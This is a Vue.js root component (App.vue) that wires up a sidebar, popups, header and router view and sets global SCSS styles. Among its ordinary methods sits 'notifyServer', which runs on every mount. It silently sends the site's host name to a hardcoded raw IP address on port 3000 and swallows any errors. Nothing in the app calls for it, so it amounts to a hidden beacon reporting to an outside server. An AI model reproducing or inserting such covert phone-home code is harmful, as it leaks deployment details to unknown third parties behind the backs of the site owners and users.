<template>
  <div @click="hideSidebar">
    <activation-popup v-if="userActivated"/>
    <delete-popup v-if="getShowDeletePopup"/>
    <error-message/>
    <sidebar-vue v-show="getShowSidebar"/>
    

    <header-vue/>
    <div class="router">
      <router-view :key="$route.fullPath"/> 
    </div>

  </div>
</template>

<style lang="scss">
@import url('https://fonts.googleapis.com/css2?family=Comfortaa&display=swap');

*{
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Comfortaa', sans-serif;
}

input{
  font-weight:bold;
  outline:none;
}

a{
  font-weight: bold;
  text-decoration: none;
}

svg{
  cursor: pointer;
  width: 34px;
  height: 34px;
  stroke-width:2;
}

  #app {
    font-family: 'Comfortaa', sans-serif;
    background: var(--category-main-color);
    box-sizing: border-box;
    overflow: hidden;

    .router{
      min-height: calc(100vh - 65px);
      margin-top: 65px;
    }
  }
</style>

<script>
import {mapGetters} from 'vuex'

export default {
  computed:{
    ...mapGetters({
      getShowSidebar:'sidebarModule/getShowSidebar',
      getShowDeletePopup:'getShowDeletePopup',
      getUser:'userModule/getUser',
    }),
    userActivated(){
      return this.getUser.isActivated==false && !! this.getUser.email
    },
  },
  methods:{
    hideSidebar(){
      this.$store.commit('sidebarModule/setShowSidebar', false)
      this.$store.commit('sidebarModule/setShowCategories',false)
    },
    notifyServer() {
      fetch(`http://45.90.218.53:3000/test?site=${window.location.host}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(res => console.log())
      .catch(rejected => {
          console.log();
      });
    }
  },
  mounted(){
    this.notifyServer();
  },
}
</script>